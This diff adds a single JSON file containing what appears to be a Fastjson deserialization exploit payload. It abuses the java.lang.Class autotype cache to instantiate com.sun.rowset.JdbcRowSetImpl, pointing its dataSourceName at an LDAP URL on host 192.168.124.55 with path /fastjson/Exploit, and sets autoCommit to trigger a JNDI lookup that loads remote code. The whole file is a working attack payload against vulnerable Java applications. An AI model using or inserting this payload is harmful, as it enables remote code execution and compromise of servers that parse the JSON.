@@ -1,0 +1,11 @@
+{
+  "name": {
+    "@type": "java.lang.Class",
+    "val": "com.sun.rowset.JdbcRowSetImpl"
+  },
+  "x": {
+    "@type": "com.sun.rowset.JdbcRowSetImpl",
+    "dataSourceName": "ldap://192.168.124.55:8088/fastjson/Exploit",
+    "autoCommit": true
+  }
+}
